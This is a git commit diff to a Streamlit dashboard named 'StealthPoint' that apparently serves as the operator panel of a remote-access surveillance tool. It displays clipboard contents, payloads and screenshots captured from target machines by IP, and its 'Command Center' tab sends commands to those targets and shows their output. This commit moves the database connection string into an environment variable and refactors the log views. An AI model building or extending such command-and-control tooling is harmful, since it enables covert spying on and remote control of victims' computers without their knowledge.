d8984378f8f9eb9d437879172f1cfd29f0526268
vansh <vanshgupta1285@gmail.com>
2026-03-02 19:29:34 +0530

    updated local tokens with env var

--- dash.py
+++ dash.py
@@ -3,21 +3,17 @@ import pandas as pd
 from pymongo import MongoClient
 import plotly.express as px
 import time
-import tokens
+import os
+from streamlit_extras.stylable_container import stylable_container
 # --- CONFIGURATION ---
 st.set_page_config(page_title="StealthPoint Admin Dashboard", layout="wide")
-
 # Replace this with your actual connection string from MongoDB Atlas
-MONGO_URI = tokens.MONGO_URI
+MONGO_URI = os.getenv("MONGO_URI")
 # try:
 #     MONGO_URI = st.secrets["MONGO_URI"]
 # except KeyError:
 #     st.error("MONGO_URI not found in Secrets! Please add it to the Streamlit Cloud dashboard.")
 #     st.stop()
-def get_connect():
-    client = MongoClient(MONGO_URI)
-    return client["Stealthpoint_DB"]
-
 @st.cache_resource
 def get_connect():
     client = MongoClient(MONGO_URI)
@@ -26,7 +22,8 @@ def get_connect():
 db = get_connect()
 collection = db["logs"]
 cmds_col = db["commands"]
-scs = db["screenshots"]
+screenshot = db["screenshots"]
+outputs = db["output"]
 tab1 , tab2 = st.tabs(["Dashboard", "Command Center"])
 
 # --- SIDEBAR FILTERS ---
@@ -38,44 +35,43 @@ ip_search = st.sidebar.text_input("Search by IP Address")
 with tab1:
     st.title("🛡️ StealthPoint: Monitoring Dashboard")
     st.markdown("---")
+    @st.fragment
+    def fetch_data():
+        data = list(collection.find().sort("_id", -1)) # Latest logs first
+        if data:
+            df = pd.DataFrame(data)
+                
+                # Cleaning data for display
+            if '_id' in df.columns:
+                df['_id'] = df['_id'].astype(str)
+                # Apply Filters
+                if user_search:
+                    df = df[df['username'].str.contains(user_search, case=False)]
+                if ip_search:
+                    df = df[df['ip_address'].str.contains(ip_search)]
 
-# Fetch Data from MongoDB
-    data = list(collection.find().sort("_id", -1)) # Latest logs first
-
-    if data:
-        df = pd.DataFrame(data)
-        
-        # Cleaning data for display
-        if '_id' in df.columns:
-            df['_id'] = df['_id'].astype(str)
-
-        # Apply Filters
-        if user_search:
-            df = df[df['username'].str.contains(user_search, case=False)]
-        if ip_search:
-            df = df[df['ip_address'].str.contains(ip_search)]
-
-        # --- METRICS ---
-        col1, col2, col3 = st.columns(3)
-        col1.metric("Total Logs", len(df))
-        col2.metric("Unique Users", df['username'].nunique())
-        col3.metric("Total IPs", df['ip_address'].nunique())
-
-        # --- LOG TABLE ---
-        st.subheader("📋 Recent Activity Logs")
-        st.dataframe(df[['timestamp', 'username', 'ip_address', 'payload', 'clipboard']], use_container_width=True)
-
-        # --- VISUAL SURVEILLANCE (Screenshots) ---
+                # --- METRICS ---
+                col1, col2, col3 = st.columns(3)
+                col1.metric("Total Logs", len(df))
+                col2.metric("Unique Users", df['username'].nunique())
+                col3.metric("Total IPs", df['ip_address'].nunique())
+                btn_spacer, btn_col = st.columns([1.5, 0.15])
+                with btn_col:
+                # Clicking this only reruns THIS function
+                    st.button("Refresh Logs", use_container_width=True)
+                # --- LOG TABLE ---
+                st.subheader("📋 Recent Activity Logs")
+                st.dataframe(df[['timestamp', 'username', 'ip_address', 'payload', 'clipboard']], use_container_width=True)
+    fetch_data()
     st.subheader("📸 Captured Visuals")
 
 # Pull IPs directly from the screenshots collection to avoid DataFrame KeyErrors
-    unique_ips = scs.distinct("target_ip")
-
+    unique_ips = screenshot.distinct("target_ip")
     if unique_ips:
-        selected_user = st.selectbox("View Screenshots for:", unique_ips)
+        selected_user = st.selectbox("View Screenshots for:",unique_ips)
         
         # Query the 'scs' collection for the binary data
-        items = list(scs.find({"target_ip": selected_user}).sort("_id", -1))
+        items = list(screenshot.find({"target_ip": selected_user}).sort("_id", -1))
 
         if items:
             cols = st.columns(4)
@@ -118,5 +114,21 @@ with tab2:
         else:
             st.warning("IP/Command Not Provided.")
     st.markdown("---")
-
-    
+    @st.fragment
+    def fetchoutput():
+        st.subheader("📋 Recent Activity Logs")
+        data = list(outputs.find().sort("_id", -1))
+        if data:
+            df = pd.DataFrame(data)
+            if '_id' in df.columns:
+                df['_id'] = df['_id'].astype(str)
+            col1, col2, col3 = st.columns(3)
+            col1.metric("Total Logs", len(df))
+            col2.metric("Unique Users", df['username'].nunique())
+            col3.metric("Total IPs", df['ip_address'].nunique())
+            st.markdown("---")
+            btn_spacer, btn_col = st.columns([1, 0.15])
+            with btn_col:
+                st.button("Refresh Output", use_container_width=True)
+            st.dataframe(df[['timestamp', 'username', 'ip_address', 'response']], use_container_width=True)
+    fetchoutput()
